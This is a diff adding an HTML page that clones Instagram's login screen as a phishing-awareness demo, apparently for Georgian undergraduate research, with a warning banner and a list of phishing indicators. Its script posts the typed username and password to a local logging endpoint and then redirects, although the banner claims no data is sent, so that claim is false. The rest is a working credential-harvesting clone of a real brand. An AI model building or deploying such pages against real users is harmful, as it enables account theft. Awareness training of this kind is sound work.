@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="ka">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram – DEMO</title>
+<style>
+  :root {
+    --ig-gradient: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    --ig-blue: #0095f6;
+    --ig-border: #dbdbdb;
+    --ig-gray: #fafafa;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: var(--ig-gray);
+    min-height: 100vh;
+    display: flex; flex-direction: column; align-items: center;
+  }
+
+  .warning-banner {
+    width: 100%; background: #c0392b; color: #fff;
+    text-align: center; padding: 12px 20px;
+    font-size: 13px; font-weight: bold;
+    position: sticky; top: 0; z-index: 9999;
+  }
+
+  .indicators {
+    width: 100%; max-width: 700px;
+    margin: 16px auto 0;
+    background: #fff3cd; border: 2px solid #ffc107;
+    border-radius: 10px; padding: 14px 20px;
+  }
+  .indicators h3 { color: #856404; font-size: 13px; margin-bottom: 8px; }
+  .indicators ul { color: #533f03; font-size: 12px; padding-left: 18px; line-height: 1.8; }
+
+  .url-bar {
+    width: 100%; max-width: 700px;
+    background: #2d2d2d; color: #aaa;
+    font-size: 12px; padding: 8px 16px;
+    display: flex; align-items: center; gap: 8px;
+    font-family: monospace; border-radius: 8px 8px 0 0; margin-top: 10px;
+  }
+  .url-bar .fake { color: #e74c3c; }
+  .url-bar .real { color: #27ae60; }
+
+  /* ─── MAIN ─── */
+  .page-wrap {
+    width: 100%; max-width: 700px;
+    border-radius: 0 0 12px 12px; overflow: hidden;
+    box-shadow: 0 2px 20px rgba(0,0,0,0.08);
+    margin-bottom: 40px;
+    background: var(--ig-gray);
+  }
+
+  /* TOP NAV */
+  .ig-nav {
+    background: #fff;
+    border-bottom: 1px solid var(--ig-border);
+    padding: 0 20px;
+    display: flex; align-items: center; justify-content: space-between;
+    height: 54px;
+  }
+  .ig-logo-text {
+    font-family: 'Billabong', 'Grand Hotel', cursive;
+    font-size: 26px; color: #1c1c1c;
+    letter-spacing: -0.5px;
+    background: var(--ig-gradient);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .ig-nav-icons { display: flex; gap: 18px; font-size: 20px; color: #1c1c1c; cursor: pointer; }
+
+  /* MAIN CONTENT */
+  .ig-content {
+    display: flex; gap: 0;
+    min-height: 500px;
+  }
+
+  /* LEFT - PHONE MOCKUP */
+  .ig-phone-side {
+    flex: 1;
+    display: flex; align-items: center; justify-content: center;
+    padding: 40px 20px;
+  }
+  .phone-mockup {
+    width: 200px; height: 320px;
+    border: 8px solid #1c1c1c;
+    border-radius: 28px;
+    background: #000;
+    position: relative;
+    overflow: hidden;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.25);
+  }
+  .phone-screen {
+    width: 100%; height: 100%;
+    background: var(--ig-gradient);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 48px;
+    animation: pulse 2s ease-in-out infinite;
+  }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.7} }
+  .phone-notch {
+    position: absolute; top: 8px; left: 50%; transform: translateX(-50%);
+    width: 60px; height: 14px;
+    background: #1c1c1c; border-radius: 8px;
+  }
+
+  /* RIGHT - LOGIN BOX */
+  .ig-login-side {
+    width: 350px;
+    padding: 20px 0;
+    display: flex; flex-direction: column; gap: 12px;
+    align-self: center; margin: 20px 32px 20px 0;
+  }
+  .ig-box {
+    background: #fff;
+    border: 1px solid var(--ig-border);
+    border-radius: 1px;
+    padding: 32px 40px;
+  }
+  .ig-box-logo {
+    font-family: 'Billabong', 'Grand Hotel', cursive;
+    font-size: 46px;
+    background: var(--ig-gradient);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    text-align: center;
+    margin-bottom: 22px;
+  }
+
+  .ig-box input {
+    width: 100%;
+    padding: 9px 8px 7px;
+    background: var(--ig-gray);
+    border: 1px solid var(--ig-border);
+    border-radius: 3px;
+    font-size: 12px; outline: none;
+    margin-bottom: 6px;
+  }
+  .ig-box input:focus { border-color: #a2a2a2; }
+
+  .btn-ig-login {
+    width: 100%; padding: 7px;
+    background: var(--ig-blue); color: #fff;
+    border: none; border-radius: 8px;
+    font-size: 14px; font-weight: 600;
+    cursor: pointer; margin-top: 6px;
+    transition: background .15s;
+  }
+  .btn-ig-login:hover { background: #1aa0f5; }
+  .btn-ig-login:disabled { background: #9fcfed; cursor: default; }
+
+  .ig-divider {
+    display: flex; align-items: center; gap: 12px;
+    margin: 14px 0;
+  }
+  .ig-divider hr { flex: 1; border: none; border-top: 1px solid var(--ig-border); }
+  .ig-divider span { font-size: 13px; color: #8e8e8e; font-weight: 600; }
+
+  .btn-fb-login {
+    width: 100%; padding: 8px;
+    background: none; color: #385185;
+    border: none; cursor: pointer;
+    font-size: 14px; font-weight: 600;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+  }
+
+  .forgot-link { text-align: center; font-size: 12px; }
+  .forgot-link a { color: #00376b; text-decoration: none; font-size: 12px; }
+
+  .ig-box2 {
+    background: #fff;
+    border: 1px solid var(--ig-border);
+    padding: 18px;
+    text-align: center;
+    font-size: 14px; color: #1c1c1c;
+  }
+  .ig-box2 a { color: var(--ig-blue); font-weight: 600; text-decoration: none; }
+
+  /* ─── POPUP ─── */
+  .overlay {
+    display: none; position: fixed; inset: 0;
+    background: rgba(0,0,0,0.6);
+    z-index: 8888; align-items: center; justify-content: center;
+  }
+  .overlay.show { display: flex; }
+  .popup {
+    background: #fff; border-radius: 14px;
+    padding: 36px 40px; max-width: 460px; width: 90%;
+    text-align: center;
+  }
+  .popup .icon { font-size: 52px; margin-bottom: 12px; }
+  .popup h2 { font-size: 20px; margin-bottom: 10px; }
+  .popup p { font-size: 13px; color: #555; line-height: 1.7; margin-bottom: 16px; }
+  .captured {
+    background: #fff3cd; border: 1px solid #ffc107;
+    border-radius: 8px; padding: 14px; margin-bottom: 18px;
+    font-size: 13px; color: #856404; text-align: left;
+  }
+  .captured strong { display: block; font-size: 11px; text-transform: uppercase; margin-bottom: 6px; }
+  .popup button {
+    background: #c0392b; color: #fff; border: none;
+    border-radius: 8px; padding: 12px 32px;
+    font-size: 14px; font-weight: 600; cursor: pointer;
+  }
+
+  .ig-footer {
+    padding: 14px 20px;
+    text-align: center;
+    font-size: 11px; color: #8e8e8e;
+    background: var(--ig-gray);
+    border-top: 1px solid var(--ig-border);
+  }
+</style>
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="warning-banner">
+  ⚠️ სასწავლო/სადემონსტრაციო ფიშინგის სიმულაცია — საბაკალავრო კვლევა. მონაცემები არ იგზავნება.
+</div>
+
+<div class="indicators">
+  <h3>🔍 ფიშინგის ინდიკატორები:</h3>
+  <ul>
+    <li><strong>URL:</strong> რეალური: <code>instagram.com</code> — ყალბი: <code>1nstagram-verify.account-secure.com</code></li>
+    <li><strong>ვიზუალური კლონი:</strong> gradient, ლოგო, layout — ყველაფერი კოპირებულია CSS/HTML-ის საშუალებით</li>
+    <li><strong>Credential Harvesting:</strong> username + password → attacker DB; შემდეგ redirect ნამდვილ Instagram-ზე</li>
+    <li><strong>Spear Phishing ვარიანტი:</strong> SMS/email-ით "ანგარიში დაიბლოკება, გადაამოწმე" — მსხვერპლი თავად მოდის ბმულზე</li>
+    <li><strong>Account Takeover:</strong> მიღებული credentials-ით ახდენენ ანგარიშის გადაბარებას, შემდეგ scam-ს ვრცელებენ მეგობრებზე</li>
+  </ul>
+</div>
+
+<div class="url-bar">
+  🔒 <span class="fake">1nstagram-verify.account-secure.com/login/checkpoint</span>
+  <span style="color:#666;margin-left:auto">რეალური: <span class="real">instagram.com</span></span>
+</div>
+
+<div class="page-wrap">
+  <!-- NAV -->
+  <div class="ig-nav">
+    <div style="width:80px"></div>
+    <div class="ig-logo-text">Instagram</div>
+    <div class="ig-nav-icons">⊕ ✈️</div>
+  </div>
+
+  <!-- CONTENT -->
+  <div class="ig-content">
+    <div class="ig-phone-side">
+      <div class="phone-mockup">
+        <div class="phone-notch"></div>
+        <div class="phone-screen">📸</div>
+      </div>
+    </div>
+
+    <div class="ig-login-side">
+      <div class="ig-box">
+        <div class="ig-box-logo">Instagram</div>
+        <input type="text" id="username" placeholder="ტელეფონის ნომერი, მომხმარებლის სახელი ან ელ. ფოსტა" autocomplete="off">
+        <input type="password" id="password" placeholder="პაროლი">
+        <button class="btn-ig-login" onclick="submitForm()">შესვლა</button>
+
+        <div class="ig-divider">
+          <hr><span>ან</span><hr>
+        </div>
+
+        <button class="btn-fb-login">
+          <span style="font-size:16px">f</span> Facebook-ით შესვლა
+        </button>
+
+        <div class="forgot-link" style="margin-top:12px">
+          <a href="#">პაროლი დაგავიწყდათ?</a>
+        </div>
+      </div>
+
+      <div class="ig-box2">
+        ანგარიში არ გაქვთ? <a href="#">დარეგისტრირდი</a>
+      </div>
+
+      <div style="text-align:center;font-size:13px;margin-top:16px;color:#1c1c1c;">
+        აპლიკაციის ჩამოტვირთვა
+        <div style="display:flex;justify-content:center;gap:8px;margin-top:8px">
+          <span style="background:#1c1c1c;color:#fff;padding:6px 14px;border-radius:6px;font-size:11px;">App Store</span>
+          <span style="background:#1c1c1c;color:#fff;padding:6px 14px;border-radius:6px;font-size:11px;">Google Play</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="ig-footer">
+    Meta © 2024 · კონფიდენციალურობა · პირობები · Cookie · კარიერა · ენები
+  </div>
+</div>
+
+<!-- POPUP -->
+<div class="overlay" id="overlay">
+  <div class="popup">
+    <div class="icon">🎣</div>
+    <h2>ფიშინგის სიმულაცია დასრულდა!</h2>
+    <p>Instagram-ის ფიშინგი განსაკუთრებით ეფექტურია — ანგარიშის გატაცების შემდეგ Scammer-ები მეგობრებს სპამ-ავენ:</p>
+    <div class="captured">
+      <strong>⚠️ "ჩაჭერილი" მონაცემები (სიმულაცია):</strong>
+      <div id="captured-data"></div>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:16px;">
+      შემდეგი ეტაპი: redirect to <strong>instagram.com</strong> with error message → მსხვერპლი ფიქრობს "შეიყვანა არასწორი პაროლი" → 
+      ეჭვი არ ეპარება, მაგრამ credentials უკვე მოიპარეს.
+    </p>
+    <button onclick="document.getElementById('overlay').classList.remove('show')">გასაგებია</button>
+  </div>
+</div>
+
+<script>
+function submitForm() {
+  const username = document.getElementById('username').value || '(ცარიელი)';
+  const password = document.getElementById('password').value || '(ცარიელი)';
+
+  fetch("https://localhost:7011/api/log", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      type: "Instagram",
+      email: username,
+      password: password
+    })
+  });
+
+  document.getElementById('captured-data').innerHTML =
+    `📌 Type: <strong>${"Instagram"}</strong><br>
+    👤 Username/Email: <strong>${username}</strong><br>
+     🔑 პაროლი: <strong>${password}</strong><br>
+     📍 IP, Device fingerprint, Session data`;
+
+// redirect 1 წამში
+  setTimeout(() => {
+    window.location.href = "techshop-referral-demo2.html";
+  }, 1000);
+}
+
+</script>
+</body>
+</html>
